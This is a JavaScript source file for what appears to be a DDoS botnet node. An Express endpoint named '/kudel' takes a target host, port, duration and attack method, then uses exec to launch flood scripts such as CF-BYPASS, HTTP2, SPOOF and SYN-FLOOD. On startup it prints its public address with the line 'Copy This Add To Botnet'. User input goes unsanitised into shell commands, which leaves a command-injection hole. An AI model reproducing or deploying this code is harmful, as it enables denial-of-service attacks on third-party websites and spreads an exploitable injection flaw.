const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;

  if (!host || !port || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  const attackMethods = {
    'HTTP-BYPASS': `./lib/cache/HTTP_BYPASS.js ${host} ${time} 30 1 proxy.txt`,
    'CF-BYPASS': `./lib/cache/CF_BYPASS.js ${host} ${time} 1 proxy.txt 30 captcha`,
    'HTTP-NULL': `./lib/cache/HTTP_NULL.js ${host} ${time} 1 30`,
    'HTTP2': `./lib/cache/HTTP2.js ${host} ${time} 30 1 proxy.txt http2`,
    'HTTP-RAW': `python ./lib/cache/HTTP_RAW.py ${host} ${time} 30 1 proxy.txt`, // Contoh skrip Python
    'SPOOF': `./lib/cache/SPOOF.js ${host} ${time} 30 1 proxy.txt`,
    'FLOOD-QUERYSTRING': `./lib/cache/FLOOD_QUERYSTRING.js ${host} proxy.txt ${time} GET 1`,
    'SAXIOS-FLOW': `./lib/cache/SAXIOS_FLOW.js ${host} ${time} 10 4 proxy.txt flood`,
    'BROWSER': `./lib/cache/browser-based-flood.js ${host} ${time} 30 1 proxy.txt`,
    'APACHE': `./lib/cache/APACHE.js ${host} ${time} 30 1 proxy.txt`,
    'TCP/SYN/UDP': `./lib/cache/SYN-FLOOD.py ${time} ${host} ${port} 1000 10`
  };

  const selectedMethod = attackMethods[methods];

  if (selectedMethod) {
    if (Array.isArray(selectedMethod)) {
      selectedMethod.forEach(script => {
        const command = script.startsWith('python') ? script : `node ${script}`;
        exec(command, (error, stdout, stderr) => {
          if (error) {
            console.error(`Execution error: ${error}`);
            return;
          }
          console.log(`Executed: ${script}`);
        });
      });
    } else {
      const command = selectedMethod.startsWith('python') ? selectedMethod : `node ${selectedMethod}`;
      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error(`Execution error: ${error}`);
          return;
        }
        console.log(`Executed: ${selectedMethod}`);
      });
    }
  } else {
    console.log(`Unsupported method: ${methods}`);
  }
});

app.listen(port, () => {
  fetchData();
});